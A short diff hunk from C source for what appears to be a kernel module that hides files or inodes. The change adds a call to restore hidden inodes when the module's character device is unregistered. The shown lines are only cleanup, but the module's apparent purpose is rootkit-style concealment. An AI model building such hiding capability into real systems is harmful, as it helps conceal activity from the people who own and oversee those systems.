@@ -91,6 +91,7 @@ int hide_register_device(void){
 
 void hide_unregister_device(void){
 	if ( device_file_major_number != 0 ){
+		hide_ino_recover();
 		unregister_chrdev( device_file_major_number, device_name );
 	}
 }
